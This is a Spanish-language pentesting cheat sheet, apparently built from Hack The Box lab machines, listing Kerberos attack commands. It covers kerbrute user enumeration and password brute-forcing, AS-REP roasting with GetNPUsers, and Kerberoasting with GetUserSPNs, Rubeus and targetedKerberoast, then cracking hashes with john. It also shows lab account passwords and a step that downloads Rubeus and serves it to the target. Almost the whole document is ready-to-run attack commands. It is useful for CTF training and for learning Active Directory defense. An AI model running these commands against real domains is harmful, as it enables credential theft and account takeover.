
### ENUMERACIÓN DE USUARIOS
```shell
❯ kerbrute userenum --dc 10.10.10.192 -d blackfield.local users
```

### FUERZA BRUTA
```shell
#DE USUARIOS
❯ kerbrute userenum --dc 10.10.11.250 -d analysis.htb /usr/share/SecLists/Usernames/xato-net-10-million-usernames.txt

#DE CONTRASEAÑAS TENIENDO UN USUARIOS
kerbrute bruteuser --dc 10.10.11.168 -d scrm.local passFile Victim-Username
```


### ASREPRoast
```shell
❯ GetNPUsers.py htb.local/ -no-pass -usersfile users
```


### VERIFICAR SI ES KERBEROASTEABLE TGT
```shell
#CON CREDENCIALES
❯ GetUserSPNs.py MEGABANK.LOCAL/SABatchJobs:SABatchJobs -dc-ip 10.10.10.172

❯ GetUserSPNs.py MEGABANK.LOCAL/SABatchJobs:SABatchJobs -dc-ip 10.10.10.172 -k #OPERAR POR KERBEROOS
#GetUserSPNs se utiliza para identificar cuentas de servicio a través de los SPNs que están asociados con ellas.
```


### KERBEROS PRE-AUTHENTICATION
```shell
# SIN CREDENCIALES
❯ impacket-GetNPUsers -no-pass -usersfile users hospital.htb/

# CON CREDENCIALES
❯ impacket-GetNPUsers 'hospital.htb/drwilliams:qwe123!@#'

#GetNPUsers se utiliza para identificar cuentas vulnerables que no requieren preautenticación Kerberos.
```

### SOLICITAR EL TGT
```shell
#SIN CREDENCIALES
❯ impacket-GetNPUsers -no-pass -usersfile users hospital.htb/ -request
```


### USUARIOS KERBEROASTEABLES CON CREDENCIALES
```shell
❯ GetUserSPNs.py htb.local/amanda:Ashare1972
```


### ATAQUE DE KERBEROS EN LA MÁQUINA
```shell
[SUBIDA DEL ARCHIVO]
	❯ wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/refs/heads/master/Rubeus.exe
❯ sudo python3 -m http.server 80
PS C:\Windows\Temp\Recon> .\Rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972
```

```shell
When the attacker can add SPN ( ServicePrincipalName ) to the target account and once the account has that SPN, it becomes vulnerable to kerberoasting.
```

```shell
git clone https://github.com/ShutdownRepo/targetedKerberoast
cd targetedKerberoast
pip3 install -r requirements.txt --break-system-packages
sudo rdate -n 10.10.11.42

python3 targetedKerberoast.py -v -d 'Administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'

john hash --wordlist=/usr/share/wordlists/rockyou.txt
```